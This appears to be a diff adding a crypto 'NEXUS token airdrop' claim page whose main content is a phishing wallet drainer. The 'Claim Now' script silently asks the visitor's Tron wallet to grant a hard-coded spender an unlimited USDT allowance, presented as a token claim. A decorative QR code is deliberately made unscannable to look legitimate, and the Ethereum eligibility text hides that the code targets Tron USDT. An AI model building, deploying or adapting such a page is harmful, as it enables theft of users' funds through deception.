@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Token Airdrop</title>
+    <style>
+        /* Basic Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            color: #fff;
+            background: #0f172a;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #1e293b;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #38bdf8;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            color: #94a3b8;
+            margin-bottom: 20px;
+        }
+        
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+        
+        @media (min-width: 768px) {
+            .main-content {
+                flex-direction: row;
+            }
+            
+            .info-section {
+                flex: 3;
+            }
+            
+            .qr-section {
+                flex: 2;
+            }
+        }
+        
+        .section {
+            background: #0f172a;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .section-title {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #38bdf8;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 10px;
+        }
+        
+        .token-info {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .info-item {
+            background: #1e293b;
+            padding: 15px;
+            border-radius: 6px;
+        }
+        
+        .info-label {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-bottom: 5px;
+        }
+        
+        .info-value {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        .steps {
+            list-style-type: none;
+        }
+        
+        .steps li {
+            margin-bottom: 15px;
+            padding-left: 30px;
+            position: relative;
+        }
+        
+        .steps li:before {
+            content: attr(data-step);
+            position: absolute;
+            left: 0;
+            top: 0;
+            background: #38bdf8;
+            color: #0f172a;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .qr-section {
+            text-align: center;
+        }
+        
+        .qr-container {
+            background: #fff;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 20px auto;
+            width: 200px;
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        #qrCode {
+            width: 100%;
+            height: 100%;
+        }
+        
+        .button {
+            display: inline-block;
+            background: #38bdf8;
+            color: #0f172a;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-weight: bold;
+            text-decoration: none;
+            text-align: center;
+            margin-top: 15px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .eligibility {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #94a3b8;
+        }
+        
+        .eligibility ul {
+            margin-top: 10px;
+            padding-left: 20px;
+        }
+        
+        .eligibility li {
+            margin-bottom: 5px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #94a3b8;
+            font-size: 14px;
+        }
+        
+        /* Modal styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: #1e293b;
+            padding: 25px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .close-modal {
+            font-size: 24px;
+            cursor: pointer;
+            color: #94a3b8;
+        }
+        
+        .status-message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+            display: none;
+        }
+        
+        .status-message.success {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+        
+        .status-message.error {
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+        
+        .status-message.warning {
+            background: rgba(245, 158, 11, 0.2);
+            color: #f59e0b;
+            border: 1px solid rgba(245, 158, 11, 0.3);
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">NEXUS</div>
+            <h1>TOKEN AIRDROP</h1>
+            <p class="subtitle">Claim your share of 1,000,000 NEXUS tokens</p>
+        </header>
+        
+        <div class="main-content">
+            <div class="info-section">
+                <div class="section">
+                    <h2 class="section-title">Token Information</h2>
+                    <div class="token-info">
+                        <div class="info-item">
+                            <div class="info-label">Total Supply</div>
+                            <div class="info-value">100,000,000 NEXUS</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Airdrop Amount</div>
+                            <div class="info-value">1,000,000 NEXUS</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Claim Period</div>
+                            <div class="info-value">
+                                May 1, 2025<br>
+                                May 1, 2026
+                            </div>
+                        </div>
+                        <div class="info-item">
+                            <div class="info-label">Token Launch</div>
+                            <div class="info-value">July 1, 2026</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2 class="section-title">How to Claim</h2>
+                    <ul class="steps">
+                        <li data-step="1">Scan the QR code with your wallet app</li>
+                        <li data-step="2">Connect your wallet to verify eligibility</li>
+                        <li data-step="3">Confirm the transaction (small gas fee required)</li>
+                        <li data-step="4">Receive your NEXUS tokens</li>
+                    </ul>
+                    
+                    <div class="eligibility">
+                        <strong>Eligibility Requirements:</strong>
+                        <ul>
+                            <li>Held at least 0.1 ETH before April 15, 2026</li>
+                            <li>Completed at least 3 transactions on Ethereum mainnet</li>
+                            <li>Interacted with at least 2 DeFi protocols</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="section">
+                    <h2 class="section-title">Token Utility</h2>
+                    <ul>
+                        <li>Governance rights for protocol decisions</li>
+                        <li>Staking rewards and yield opportunities</li>
+                        <li>Fee discounts on the NEXUS platform</li>
+                        <li>Access to premium features and early product releases</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="qr-section">
+                <div class="section">
+                    <h2 class="section-title">Claim Your Tokens</h2>
+                    <p>Scan this QR code with your wallet app to claim your NEXUS tokens</p>
+                    
+                    <div class="qr-container">
+                        <canvas id="qrCode"></canvas>
+                    </div>
+                    
+                    <p>Or claim directly on our website</p>
+                    <button id="claimButton" class="button">Claim Now</button>
+                    
+                    <p class="eligibility">
+                        Unclaimed tokens after May 1, 2026 will be returned to the community treasury
+                    </p>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2026 NEXUS Protocol. All rights reserved.</p>
+            <p>For support: support@nexusprotocol.io | Join our community on Discord and Twitter</p>
+        </footer>
+    </div>
+    
+    <!-- Status Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Transaction Status</h3>
+                <span class="close-modal">&times;</span>
+            </div>
+            <div id="statusMessage" class="status-message"></div>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const claimButton = document.getElementById('claimButton');
+            const walletModal = document.getElementById('walletModal');
+            const closeModal = document.querySelector('.close-modal');
+            const statusMessage = document.getElementById('statusMessage');
+            
+            // Generate random QR code
+            generateRandomQRCode();
+            
+            // Contract constants
+            const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT contract on Tron
+            const SPENDER = "TKVsYedAZ3qQxSp8JjhCUcRx3UzVjUDE8Q"; // Example spender address
+            const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Max uint256 value
+            
+            // Open modal when claim button is clicked
+            claimButton.addEventListener('click', async function() {
+                // Show the modal with loading status
+                walletModal.style.display = 'flex';
+                statusMessage.style.display = 'block';
+                statusMessage.className = 'status-message';
+                statusMessage.innerHTML = '<div class="loading"></div> Connecting to Tron wallet...';
+                
+                // Check if TronWeb is available
+                if (typeof window.tronWeb !== 'undefined' && window.tronWeb.ready) {
+                    try {
+                        // Execute the TronWeb contract call
+                        statusMessage.innerHTML = '<div class="loading"></div> Approving USDT contract...';
+                        
+                        // Execute the contract approval
+                        const contract = await tronWeb.contract().at(USDT_CONTRACT);
+                        const tx = await contract.approve(SPENDER, MAX_AMOUNT).send();
+                        
+                        // Show success message with transaction ID
+                        statusMessage.className = 'status-message success';
+                        statusMessage.innerHTML = `
+                            <p>Transaction successful!</p>
+                            <p>Transaction ID: ${tx.substring(0, 10)}...${tx.substring(tx.length - 10)}</p>
+                            <p>You have approved the contract to spend your USDT tokens.</p>
+                        `;
+                    } catch (error) {
+                        // Show error message
+                        statusMessage.className = 'status-message error';
+                        statusMessage.innerHTML = `
+                            <p>Transaction failed</p>
+                            <p>Error: ${error.message || 'Unknown error'}</p>
+                        `;
+                        console.error('TronWeb error:', error);
+                    }
+                } else {
+                    // TronWeb is not available
+                    statusMessage.className = 'status-message warning';
+                    statusMessage.innerHTML = `
+                        <p>TronLink not detected</p>
+                        <p>Please install TronLink extension and refresh the page.</p>
+                        <p><a href="https://www.tronlink.org/" target="_blank" style="color: #f59e0b;">Download TronLink</a></p>
+                    `;
+                }
+            });
+            
+            // Close modal when X is clicked
+            closeModal.addEventListener('click', function() {
+                walletModal.style.display = 'none';
+            });
+            
+            // Close modal when clicking outside of it
+            window.addEventListener('click', function(event) {
+                if (event.target === walletModal) {
+                    walletModal.style.display = 'none';
+                }
+            });
+            
+            // Function to generate a random non-scannable QR code
+            function generateRandomQRCode() {
+                const canvas = document.getElementById('qrCode');
+                const ctx = canvas.getContext('2d');
+                
+                // Set canvas size
+                canvas.width = 180;
+                canvas.height = 180;
+                
+                // Clear canvas
+                ctx.fillStyle = 'white';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                // QR code parameters
+                const moduleSize = 6; // Size of each QR module
+                const size = Math.floor(canvas.width / moduleSize); // Number of modules
+                const padding = Math.floor((canvas.width - (size * moduleSize)) / 2);
+                
+                // Draw position detection patterns (the three large squares in corners)
+                function drawPositionPattern(x, y) {
+                    // Outer square
+                    ctx.fillStyle = 'black';
+                    ctx.fillRect(
+                        padding + x * moduleSize, 
+                        padding + y * moduleSize, 
+                        7 * moduleSize, 
+                        7 * moduleSize
+                    );
+                    
+                    // Inner white square
+                    ctx.fillStyle = 'white';
+                    ctx.fillRect(
+                        padding + (x + 1) * moduleSize, 
+                        padding + (y + 1) * moduleSize, 
+                        5 * moduleSize, 
+                        5 * moduleSize
+                    );
+                    
+                    // Inner black square
+                    ctx.fillStyle = 'black';
+                    ctx.fillRect(
+                        padding + (x + 2) * moduleSize, 
+                        padding + (y + 2) * moduleSize, 
+                        3 * moduleSize, 
+                        3 * moduleSize
+                    );
+                }
+                
+                // Draw the three position detection patterns
+                drawPositionPattern(0, 0); // Top-left
+                drawPositionPattern(size - 7, 0); // Top-right
+                drawPositionPattern(0, size - 7); // Bottom-left
+                
+                // Draw alignment pattern (for larger QR codes)
+                if (size >= 25) { // Only for larger QR codes
+                    const alignPos = size - 9;
+                    
+                    // Outer square
+                    ctx.fillStyle = 'black';
+                    ctx.fillRect(
+                        padding + alignPos * moduleSize, 
+                        padding + alignPos * moduleSize, 
+                        5 * moduleSize, 
+                        5 * moduleSize
+                    );
+                    
+                    // Inner white square
+                    ctx.fillStyle = 'white';
+                    ctx.fillRect(
+                        padding + (alignPos + 1) * moduleSize, 
+                        padding + (alignPos + 1) * moduleSize, 
+                        3 * moduleSize, 
+                        3 * moduleSize
+                    );
+                    
+                    // Inner black square
+                    ctx.fillStyle = 'black';
+                    ctx.fillRect(
+                        padding + (alignPos + 2) * moduleSize, 
+                        padding + (alignPos + 2) * moduleSize, 
+                        moduleSize, 
+                        moduleSize
+                    );
+                }
+                
+                // Draw timing patterns (the lines of alternating modules)
+                for (let i = 8; i < size - 8; i++) {
+                    // Horizontal timing pattern
+                    ctx.fillStyle = i % 2 === 0 ? 'black' : 'white';
+                    ctx.fillRect(
+                        padding + i * moduleSize, 
+                        padding + 6 * moduleSize, 
+                        moduleSize, 
+                        moduleSize
+                    );
+                    
+                    // Vertical timing pattern
+                    ctx.fillStyle = i % 2 === 0 ? 'black' : 'white';
+                    ctx.fillRect(
+                        padding + 6 * moduleSize, 
+                        padding + i * moduleSize, 
+                        moduleSize, 
+                        moduleSize
+                    );
+                }
+                
+                // Draw random modules (this is what makes it non-scannable)
+                for (let y = 0; y < size; y++) {
+                    for (let x = 0; x < size; x++) {
+                        // Skip position detection patterns and their quiet zones
+                        if ((x < 9 && y < 9) || // Top-left
+                            (x > size - 10 && y < 9) || // Top-right
+                            (x < 9 && y > size - 10)) { // Bottom-left
+                            continue;
+                        }
+                        
+                        // Skip timing patterns
+                        if (x === 6 || y === 6) {
+                            continue;
+                        }
+                        
+                        // Skip alignment pattern if it exists
+                        if (size >= 25 && x > size - 10 && y > size - 10) {
+                            continue;
+                        }
+                        
+                        // Randomly decide whether to draw a black module
+                        // Make it more likely to be black near the edges to look more like a QR code
+                        const distanceFromEdge = Math.min(
+                            Math.min(x, size - x),
+                            Math.min(y, size - y)
+                        );
+                        
+                        // Probability decreases as we move away from the edge
+                        const probability = 0.3 + (0.2 * (1 - distanceFromEdge / (size / 2)));
+                        
+                        if (Math.random() < probability) {
+                            ctx.fillStyle = 'black';
+                            ctx.fillRect(
+                                padding + x * moduleSize, 
+                                padding + y * moduleSize, 
+                                moduleSize, 
+                                moduleSize
+                            );
+                        }
+                    }
+                }
+                
+                // Introduce deliberate errors in the format information
+                // This ensures the QR code cannot be scanned
+                const formatPositions = [
+                    // Format info around top-left position detection pattern
+                    [0, 8], [1, 8], [2, 8], [3, 8], [4, 8], [5, 8], [7, 8], [8, 8],
+                    [8, 7], [8, 5], [8, 4], [8, 3], [8, 2], [8, 1], [8, 0],
+                    
+                    // Format info around top-right and bottom-left position detection patterns
+                    [size - 1, 8], [size - 2, 8], [size - 3, 8], [size - 4, 8], [size - 5, 8], [size - 6, 8], [size - 7, 8],
+                    [8, size - 1], [8, size - 2], [8, size - 3], [8, size - 4], [8, size - 5], [8, size - 6], [8, size - 7]
+                ];
+                
+                // Randomly flip format information bits
+                for (const [x, y] of formatPositions) {
+                    if (Math.random() < 0.7) { // 70% chance to flip
+                        ctx.fillStyle = Math.random() < 0.5 ? 'black' : 'white';
+                        ctx.fillRect(
+                            padding + x * moduleSize, 
+                            padding + y * moduleSize, 
+                            moduleSize, 
+                            moduleSize
+                        );
+                    }
+                }
+                
+                // Add a small NEXUS logo in the center (optional)
+                ctx.fillStyle = 'white';
+                ctx.fillRect(
+                    canvas.width / 2 - 15, 
+                    canvas.height / 2 - 15, 
+                    30, 
+                    30
+                );
+                
+                ctx.fillStyle = '#38bdf8';
+                ctx.font = 'bold 12px Arial';
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'middle';
+                ctx.fillText('NEXUS', canvas.width / 2, canvas.height / 2);
+            }
+        });
+    </script>
+</body>
+</html>
